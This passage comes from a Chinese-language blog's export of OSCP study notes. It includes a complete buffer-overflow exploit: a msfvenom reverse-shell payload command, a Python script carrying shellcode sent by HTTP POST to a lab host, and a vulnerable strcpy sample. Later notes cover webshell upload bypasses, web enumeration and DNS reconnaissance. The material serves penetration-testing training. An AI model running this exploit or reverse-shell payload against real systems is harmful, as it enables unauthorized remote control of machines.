src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815105513.png"></p><ul><li>要在反汇编器窗口中查看 0x10090c83 的内容，在执行暂停时，我们将单击“Go to address in Disassembler”按钮（图 219）并输入地址。从这里我们可以看到它确实转换为 JMP ESP 指令。<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815105724.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">...<br>filler = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">780</span><br>eip = <span class="hljs-string">&quot;\x83\x0c\x09\x10&quot;</span>  <span class="hljs-comment"># 倒着写</span><br>offset = <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">4</span><br>buffer = <span class="hljs-string">&quot;D&quot;</span> * (<span class="hljs-number">1500</span> - <span class="hljs-built_in">len</span>(filler) - <span class="hljs-built_in">len</span>(eip) - <span class="hljs-built_in">len</span>(offset))<br>inputBuffer = filler + eip + offset + buffer<br>...<br></code></pre></td></tr></table></figure></li><li>msf生成payload<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x 86/shikata_ga_nai -b <span class="hljs-string">&quot;\x00\x0a\x0d\x25\x26\x2b\x3d&quot;</span> <span class="hljs-comment"># -b 排除坏字符</span><br></code></pre></td></tr></table></figure></li><li>最终poc<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python import socket</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nSending evil buffer...&quot;</span><br>    <br>    shellcode = (<br>    <span class="hljs-string">&quot;\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1&quot;</span><br>    <span class="hljs-string">&quot;\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a&quot;</span><br>    <span class="hljs-string">&quot;\xf8\x13\xd3\x7b\x70\xf6\xe2\xbb\xe6\x73\x54\x0c\x6c\xd1\x59&quot;</span><br>    <span class="hljs-string">&quot;\xe7\x20\xc1\xea\x85\xec\xe6\x5b\x23\xcb\xc9\x5c\x18\x2f\x48&quot;</span><br>    <span class="hljs-string">&quot;\xdf\x63\x7c\xaa\xde\xab\x71\xab\x27\xd1\x78\xf9\xf0\x9d\x2f&quot;</span><br>    <span class="hljs-string">&quot;\xed\x75\xeb\xf3\x86\xc6\xfd\x73\x7b\x9e\xfc\x52\x2a\x94\xa6&quot;</span><br>    <span class="hljs-string">&quot;\x74\xcd\x79\xd3\x3c\xd5\x9e\xde\xf7\x6e\x54\x94\x09\xa6\xa4&quot;</span><br>    <span class="hljs-string">&quot;\x55\xa5\x87\x08\xa4\xb7\xc0\xaf\x57\xc2\x38\xcc\xea\xd5\xff&quot;</span><br>    <span class="hljs-string">&quot;\xae\x30\x53\x1b\x08\xb2\xc3\xc7\xa8\x17\x95\x8c\xa7\xdc\xd1&quot;</span><br>    <span class="hljs-string">&quot;\xca\xab\xe3\x36\x61\xd7\x68\xb9\xa5\x51\x2a\x9e\x61\x39\xe8&quot;</span><br>    <span class="hljs-string">&quot;\xbf\x30\xe7\x5f\xbf\x22\x48\x3f\x65\x29\x65\x54\x14\x70\xe2&quot;</span><br>    <span class="hljs-string">&quot;\x99\x15\x8a\xf2\xb5\x2e\xf9\xc0\x1a\x85\x95\x68\xd2\x03\x62&quot;</span><br>    <span class="hljs-string">&quot;\x8e\xc9\xf4\xfc\x71\xf2\x04\xd5\xb5\xa6\x54\x4d\x1f\xc7\x3e&quot;</span><br>    <span class="hljs-string">&quot;\x8d\xa0\x12\x90\xdd\x0e\xcd\x51\x8d\xee\xbd\x39\xc7\xe0\xe2&quot;</span><br>    <span class="hljs-string">&quot;\x5a\xe8\x2a\x8b\xf1\x13\xbd\xbe\x0e\x1b\x2f\xd7\x12\x1b\x4e&quot;</span><br>    <span class="hljs-string">&quot;\x9c\x9a\xfd\x3a\xf2\xca\x56\xd3\x6b\x57\x2c\x42\x73\x4d\x49&quot;</span><br>    <span class="hljs-string">&quot;\x44\xff\x62\xae\x0b\x08\x0e\xbc\xfc\xf8\x45\x9e\xab\x07\x70&quot;</span><br>    <span class="hljs-string">&quot;\xb6\x30\x95\x1f\x46\x3e\x86\xb7\x11\x17\x78\xce\xf7\x85\x23&quot;</span><br>    <span class="hljs-string">&quot;\x78\xe5\x57\xb5\x43\xad\x83\x06\x4d\x2c\x41\x32\x69\x3e\x9f&quot;</span><br>    <span class="hljs-string">&quot;\xbb\x35\x6a\x4f\xea\xe3\xc4\x29\x44\x42\xbe\xe3\x3b\x0c\x56&quot;</span><br>    <span class="hljs-string">&quot;\x75\x70\x8f\x20\x7a\x5d\x79\xcc\xcb\x08\x3c\xf3\xe4\xdc\xc8&quot;</span><br>    <span class="hljs-string">&quot;\x8c\x18\x7d\x36\x47\x99\x8d\x7d\xc5\x88\x05\xd8\x9c\x88\x4b&quot;</span><br>    <span class="hljs-string">&quot;\xdb\x4b\xce\x75\x58\x79\xaf\x81\x40\x08\xaa\xce\xc6\xe1\xc6&quot;</span><br>    <span class="hljs-string">&quot;\x5f\xa3\x05\x74\x5f\xe6&quot;</span>)<br>    filler = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">780</span><br>    eip = <span class="hljs-string">&quot;\x83\x0c\x09\x10&quot;</span><br>    offset = <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">4</span><br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    一系列无操作（或 NOP）指令，其操作码值为 0x90。顾名思义，这些指令什么都不做，只是将执行传递给下一条指令。以这种方式使用，这些指令，也定义为 NOP sled 或 NOP slide，将让 CPU “滑动”通过 NOP，直到到达有效负载。</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    nops = <span class="hljs-string">&quot;\x90&quot;</span> * <span class="hljs-number">10</span><br>    <br>    inputBuffer = filler + eip + offset + nops + shellcode<br>    <br>    content = <span class="hljs-string">&quot;username=&quot;</span> + inputBuffer + <span class="hljs-string">&quot;&amp;password=A&quot;</span><br>    buffer = <span class="hljs-string">&quot;POST /login HTTP/1.1\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Host: 10.11.0.22\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Referer: http://10.11.0.22/login\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Connection: close\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Content-Length: &quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content))+<span class="hljs-string">&quot;\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;\r\n&quot;</span><br>    buffer += content<br><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <br>    s.connect((<span class="hljs-string">&quot;10.11.0.22&quot;</span>, <span class="hljs-number">80</span>))<br>    s.send(buffer)<br>    <br>    s.close()<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nDone did you get a reverse shell?&quot;</span><br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nCould not connect!&quot;</span><br></code></pre></td></tr></table></figure></li><li>执行PoC前启动侦听<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815110549.png"></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>漏洞挖掘</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>缓冲区溢出</title>
    <link href="/2022/08/13/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/08/13/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><h2 id="x86架构"><a href="#x86架构" class="headerlink" title="x86架构"></a>x86架构</h2><h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><ul><li>在x86架构中(2+2&#x3D;4GB)当二进制程序运行时, 计算机以特定结构为其分配内存<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813114219.png"></li><li>栈区（stack）：由编译器自动分配与释放，存放为运行时函数分配的局部变量、函数参数、返回数据、返回地址等。其操作类似于数据结构中的栈。</li><li>堆区（heap）：一般由程序员自动分配，如果程序员没有释放，程序结束时可能有OS回收。其分配类似于链表。</li><li>全局区（静态区static）：数据段，程序结束后由系统释放。全局区分为已初始化全局区（data），用来存放保存全局的和静态的已初始化变量和未初始化全局区（bss），用来保存全局的和静态的未初始化变量。</li><li>常量区（文字常量区）：数据段，存放常量字符串，程序结束后有系统释放。</li><li>代码区：存放函数体（类成员函数和全局区）的二进制代码，这个段在内存中一般被标记为只读，任何对该区的写操作都会导致段错误（Segmentation Fault）。</li></ul><p><strong>在计算机预留的内存之外多出一部分覆盖到原本计算机内存中, 原本这块可能用于存放其他数据, 从而导致溢出, 堆栈之中和程序逻辑运行相关的程序逻辑, 如果可以覆盖, 就可以通过覆盖的这一段数据修改整个计算机对这个程序逻辑接下来的处理, 攻击者甚至可以完全设计一个其他的流程, 按照攻击者的意图运行他的代码。(通过溢出将payload注入进去)</strong></p><h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><ul><li>线程运行, 执行Program Images或不同DLL中的程序代码<ul><li>线程需要一些临时内存空间来存放函数、局部变量、程序控制信息</li><li>不同线程之间各自独立执行, 每个线程都有自己的堆栈</li></ul></li><li>堆栈内存以LIFO结构被CPU访问Last-In First-Out<ul><li>x86架构使用PUSH和POP汇编指令, 分别向堆栈中添加或删除数据</li></ul></li><li>程序可能还需要一个长期的、更动态的数据缓冲区域, 被称为HEAP(不讨论)</li><li>函数返回机制<ul><li>线程调用其他函数时必须指定返回地址, 函数执行之后从堆栈度去返回地址, 回到主程序流</li><li>函数的返回地址、参数和局部变量共同存储于堆栈内存之中, 成为stack frame<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813114427.png"></li></ul></li></ul><h3 id="CPU寄存器"><a href="#CPU寄存器" class="headerlink" title="CPU寄存器"></a>CPU寄存器</h3><ul><li>从CPU层面了解堆栈内存工作过程</li><li>CPU寄存器<ul><li>寄存器概念源于16位架构</li><li>E表示拓展位(32位) 0xFFFFFFFF</li><li>234IPX<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813115338.png"><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813115402.png"></li></ul></li></ul><h3 id="寄存器用途"><a href="#寄存器用途" class="headerlink" title="寄存器用途"></a>寄存器用途</h3><ul><li><p>以下寄存器通常用于存储临时数据</p><ul><li>EAX (accumulator): 算数和逻辑指令</li><li>EBX (base): 内存地址的基指针</li><li>ECX (counter): 循环、位移和滚动计数器</li><li>EDX (data): I&#x2F;O端口寻址、乘法和除法</li><li>ESI (source index): 字符串复制操作中数据和源的指针寻址</li><li>EDI (destination index): 字符串复制操作中数据和目标的指针寻址</li></ul></li><li><p>ESP堆栈指针</p><ul><li>堆栈动态存储数据、指针、参数, 程序执行过程中持续变化</li><li>ESP指针指向最新引用的堆栈位置(堆栈顶部)</li><li>指针存放内存地址。寄存器存放指针, 即存放的是内存地址</li></ul></li><li><p>EBP基指针</p><ul><li>堆栈持续变化, 函数很难准确定位自己的stack frame(局部变量、返回地址、参数)</li><li>通过基指针+偏移量解决这个问题</li></ul></li><li><p>EIP指令指针</p><ul><li>CPU执行的下一条代码指令所在的内存地址, 修改EIP则可以修改程序流(溢出关键)</li></ul></li><li><p>漏洞代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];    # 长度为<span class="hljs-number">64</span>字节字符数组, 局部变量保存在堆栈之中, 常量和全局变量存储与 .data 数据段(不通的内存区域)<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error - You must supply at least one argument\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>    &#125;<br>    <span class="hljs-built_in">strcpy</span>(buffer, argv[<span class="hljs-number">1</span>]);    # 拷贝命令参数值给buffer变量 -&gt; 堆栈<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="缓冲区溢出-1"><a href="#缓冲区溢出-1" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><ul><li>程序代码没有验证参数的长度, 参数大于64字节时, 将覆盖堆栈其他部分内容(EIP)<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813152315.png"></li></ul><h3 id="Immunity-Debugger"><a href="#Immunity-Debugger" class="headerlink" title="Immunity Debugger"></a>Immunity Debugger</h3><ul><li>调试工具作为应用程序与CPU之间的代理</li><li>停止程序执行流, 查看寄存器和内存进程内存变化</li><li><a href="https://www.immunityinc.com/products/debugger/">https://www.immunityinc.com/products/debugger/</a></li><li>File -&gt; Open</li><li>程序停止在entry point</li><li>通过报错信息定位主函数</li><li>F7 -&gt; Step into 单步跟进</li><li>F8 -&gt; Step over 执行整个函数</li><li>F2 -&gt; 下断点</li><li>F9 -&gt; 执行程序<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220813153427.png"></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>漏洞挖掘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GetShell</title>
    <link href="/2022/08/10/GetShell/"/>
    <url>/2022/08/10/GetShell/</url>
    
    <content type="html"><![CDATA[<h1 id="How-to-GetShell"><a href="#How-to-GetShell" class="headerlink" title="How to GetShell"></a>How to GetShell</h1><h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><ol><li>信息收集-弱漏洞</li><li>漏洞挖掘-漏洞验证</li><li>有一定后台权限-GetShell</li><li>提权-后渗透</li><li>内网渗透</li></ol><h2 id="后台拿shell方法总结"><a href="#后台拿shell方法总结" class="headerlink" title="后台拿shell方法总结"></a>后台拿shell方法总结</h2><h3 id="管理员权限拿shell"><a href="#管理员权限拿shell" class="headerlink" title="管理员权限拿shell"></a>管理员权限拿shell</h3><ul><li>需要有管理员权限才可以拿shell</li><li>通常需要登录后台后执行相关操作</li><li>直接上传拿shell</li></ul><h3 id="数据库备份拿shell"><a href="#数据库备份拿shell" class="headerlink" title="数据库备份拿shell"></a>数据库备份拿shell</h3><ul><li>网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如asp&#x2F;php&#x2F;jsp&#x2F;aspx等。</li><li>而网站具有数据库备份功能，这时我们就可以将webshell格式先该为允许上传的文件格式如jpg，gif等。</li><li>然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。</li></ul><h3 id="突破上传拿shell"><a href="#突破上传拿shell" class="headerlink" title="突破上传拿shell"></a>突破上传拿shell</h3><ul><li>本地js验证上传</li><li>服务器mime上传</li><li>服务器白名单上传</li><li>服务器黑名单上传</li><li>服务器 filepath上传</li><li>双文件上传</li><li>%00截断上传</li><li>上传其他脚本类型拿webshll</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>web渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web应用攻击</title>
    <link href="/2022/08/05/Web%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB/"/>
    <url>/2022/08/05/Web%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="Web应用攻击"><a href="#Web应用攻击" class="headerlink" title="Web应用攻击"></a>Web应用攻击</h1><h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><ul><li>现代开发框架和托管解决方案简化了构建和部署基于web的应用程序的过程, 然而由于缺乏成熟的应用程序代码, WEB程序通常会暴露出很大的攻击面</li><li>多重依赖, 不安全的服务器配置</li><li>web应用服务端语言不通, 每种语言都有特定的漏洞</li><li>安全配置不当、业务逻辑错误</li></ul><h2 id="Web应用评估方法"><a href="#Web应用评估方法" class="headerlink" title="Web应用评估方法"></a>Web应用评估方法</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li>收集应用信息<ul><li>功能、语言、服务端软件</li></ul></li><li>攻击的目标是不断提高我们的权限, 最终完全控制整个系统</li><li>每一步的前进, 都会给我们提供更进一步的能力</li></ul><h2 id="Web枚举"><a href="#Web枚举" class="headerlink" title="Web枚举"></a>Web枚举</h2><h3 id="Web枚举-1"><a href="#Web枚举-1" class="headerlink" title="Web枚举"></a>Web枚举</h3><ul><li><p>识别目标系统技术栈</p></li><li><p>payload需要给予目标应用技术栈基础来构建</p><ul><li>编程语言和框架</li><li>web服务器软件</li><li>数据库系统</li><li>服务器操作系统</li></ul></li><li><p>从浏览器可以收集很多信息</p></li><li><p>分析url</p><ul><li>文件拓展名可用于发现目标系统开发语言</li><li>不同框架的文件扩展名差别很大, 基于java的程序可能使用jsp、do、html等</li><li>拓展名越来越不常见, 许多语言和框架都支持路由的概念</li><li>利用路由的应用程序使用逻辑来确定向用户返回什么内容, 使拓展名在很大程度上不再重要</li></ul></li></ul><h3 id="调查页面内容"><a href="#调查页面内容" class="headerlink" title="调查页面内容"></a>调查页面内容</h3><ul><li>查看页面源代码</li></ul><h3 id="关注响应头"><a href="#关注响应头" class="headerlink" title="关注响应头"></a>关注响应头</h3><ul><li>查看服务器返回数据的两种方法</li><li>截断代理(burpsuite)</li><li>开发工具 -&gt; Network -&gt; Headers<ul><li>Server头显示web服务器软件以及版本, 名称, 或值通常显示服务端技术栈信息</li><li>X- 开头的是非标准头, 经常暴露别的信息</li><li>X-Powererd-By (php.ini &#x3D;&gt; expose_php &#x3D; off)</li><li>X-Aspnet-Version</li></ul></li></ul><h3 id="站点地图-amp-管理后台"><a href="#站点地图-amp-管理后台" class="headerlink" title="站点地图 &amp; 管理后台"></a>站点地图 &amp; 管理后台</h3><ul><li>站点地图帮助SE索引本站页面, 也包含不允许抓取的url指令</li><li>可能包含敏感路径或管理员后台<ul><li>robots.txt</li><li>sitemap.xml</li></ul></li><li>定位后台地址<ul><li>后台可能开启在不同端口或url作为本地访问或其他特殊端口访问</li><li>Tomcat -&gt; &#x2F;manager&#x2F;html</li><li>phpMyAdmin -&gt; &#x2F;phpmyadmin</li></ul></li></ul><h2 id="Web安全工具"><a href="#Web安全工具" class="headerlink" title="Web安全工具"></a>Web安全工具</h2><h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><ul><li>自动工具帮助提高效率, 但无法替代人</li><li>路径枚举<ul><li>dirb: 内建字典, 默认递归发现隐藏路径, 可结合cookie、定制头部</li><li>gobuster、dirbuster、dirsearch</li><li><code>dirb https://host/manager -r -z 10</code></li><li>-r 非递归爆破路径</li><li>-z 10 每次请求增加10毫秒</li></ul></li><li>Nikto<ul><li>包含上千个检查点, 包括服务器版本、配置错误、漏洞类型、非标头、缓存配置错误</li><li>缺点是特征明显、流量较大、速度慢</li><li><code>nikto -host=https://host -maxtime=30s</code></li></ul></li></ul><h2 id="攻击web漏洞"><a href="#攻击web漏洞" class="headerlink" title="攻击web漏洞"></a>攻击web漏洞</h2><h3 id="攻击管理后台"><a href="#攻击管理后台" class="headerlink" title="攻击管理后台"></a>攻击管理后台</h3><ul><li>发现后台, 登录后台, 密码爆破</li><li>成功登录后台可能会造成代码执行从而获取到shell</li></ul><h3 id="查询应用数据库"><a href="#查询应用数据库" class="headerlink" title="查询应用数据库"></a>查询应用数据库</h3><ul><li>进入phpmyadmin后台, 在数据库中查询应用账号</li></ul><h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h3><ul><li>检查过滤用户提交数据是web应用一个重要的功能<ul><li>删除或转意所有危险字符</li></ul></li><li>未过滤的数据在web页面显示时, 则可能发生xss漏洞<ul><li>高危客户端注入漏洞. 攻击浏览网页的其他用户</li></ul></li></ul><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><ul><li>路径遍历<ul><li>获得对服务端文件的未授权访问全, 例如web应用根目录之外的文件</li><li>攻击者获得修改文件路径的权利 ..&#x2F; or ..\</li></ul></li><li>该漏洞泄漏机密信息, 但不执行代码, 往往帮助实现文件包含漏洞</li><li>发现目录遍历漏洞<ul><li>路径遍历度去文件内容, 文件包含漏洞</li><li>共同特征是参数赋值为另一个文件, 重点关注变量名、赋值的文件拓展名</li><li>验证访问&#x2F;etc&#x2F;passwd、c:\boot.ini</li></ul></li></ul><h3 id="PHP封装器"><a href="#PHP封装器" class="headerlink" title="PHP封装器"></a>PHP封装器</h3><ul><li>PHP某些协议封装器可以帮助LFI实现注入代码</li><li>data封装器将内联数据作为URL的一部分嵌入到纯文本或base64编码数据中</li></ul><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>略</p>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>web渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞扫描</title>
    <link href="/2022/08/03/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    <url>/2022/08/03/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><ul><li>漏洞扫描是安全评估流程中的重要环节</li><li>你永远也不知道漏扫会发现什么</li></ul><h2 id="扫描流程"><a href="#扫描流程" class="headerlink" title="扫描流程"></a>扫描流程</h2><h3 id="扫描流程-1"><a href="#扫描流程-1" class="headerlink" title="扫描流程"></a>扫描流程</h3><ol><li>主机发现</li><li>完整或部分的端口扫描</li><li>基于指纹发现目标系统</li><li>发现服务、banner、服务行为、文件发现</li><li>匹配特征，发现漏洞</li></ol><ul><li>Apache Tomcat 版本4.1.x-8.0.x</li><li>某些漏扫可以发送漏洞利用代码, 但这样做有风险</li><li>自动漏扫存在较多误报漏报，软件更新不更新版本号，导致版本不匹配</li><li>自动漏扫匹配特征，速度快，是安全审计的第一步</li></ul><h3 id="使用Nessus进行漏洞扫描"><a href="#使用Nessus进行漏洞扫描" class="headerlink" title="使用Nessus进行漏洞扫描"></a>使用Nessus进行漏洞扫描</h3>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>web渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>主动信息收集</title>
    <link href="/2022/08/01/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/08/01/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><h2 id="DNS枚举"><a href="#DNS枚举" class="headerlink" title="DNS枚举"></a>DNS枚举</h2><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><ul><li>Domain Name System(DNS) 是一个层级化分布式数据库</li><li>DNS工作过程</li><li>DNS服务器缓存, 操作系统缓存, 浏览器等应用程序有独立的缓存<ul><li>DNS权威服务器控制缓存TTL</li></ul></li><li>DNS是主动信息收集最有价值的服务类</li><li>DNS记录类型<ul><li>NS      -&gt; 包含承载域NDS记录的授权服务器的名称</li><li>A       -&gt; 包含主机名的IP地址</li><li>MX      -&gt; 包含负责处理该域电子邮件的服务器的名称, 可以有多个MX记录</li><li>PTR     -&gt; 指针记录(反向区域使用)</li><li>CNAME   -&gt; 别名记录, 指向其他主机记录</li><li>TXT     -&gt; 文本记录, 可包含任意数据, 通常用于域的所有权验证</li></ul></li></ul><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><ul><li><code>host www.megacorpone.com</code> # 默认查询A记录</li><li><code>host -t mx megacorpone.com</code> # 查询MX记录</li><li><code>host -t txt megacorpone.com</code> # TXT记录</li><li><code>host idontexist.megacorpone.com</code># 爆破发现主机记录</li><li>DNS 正向查询<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> hostname <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> list.txt); <span class="hljs-keyword">do</span> hostname <span class="hljs-variable">$ip</span>.megacorpone.com; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure></li><li>不存在的返回(NXDOMAIN)</li><li>安装字典文件<ul><li><code>sudo apt install seclists</code></li></ul></li><li>DNS逆向查询爆破<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 50 100);<span class="hljs-keyword">do</span> host 38.100.193.<span class="hljs-variable">$ip</span>; <span class="hljs-keyword">done</span> |grep -v <span class="hljs-string">&quot;not found&quot;</span><br></code></pre></td></tr></table></figure></li><li>推断可能存在的mail1、mail3, 根据每一轮发现的信息不断扩大范围</li></ul><h3 id="区域传输"><a href="#区域传输" class="headerlink" title="区域传输"></a>区域传输</h3><ul><li>同一区域内中域名服务器间的数据库复制master -&gt; slave (TCP 53)</li><li>管理员配置错误, 可能允许所有人执行区域复制</li><li>发现目标域的NS记录<ul><li><code>host -t ns megacorpone.com | cut -d &quot; &quot; -f 4</code></li></ul></li><li>尝试区域传输<ul><li><code>host -l magacorpone.com ns1.megacorpone.com</code></li><li><code>host -l megacorpone.com ns2.megacorpone.com</code>  # 多试几次</li></ul></li><li>DNS自动枚举工具<ul><li><code>dnsrecon -d megacorpone.com -t axfr</code></li><li><code>dnsrecon -d megacorpone.com -D 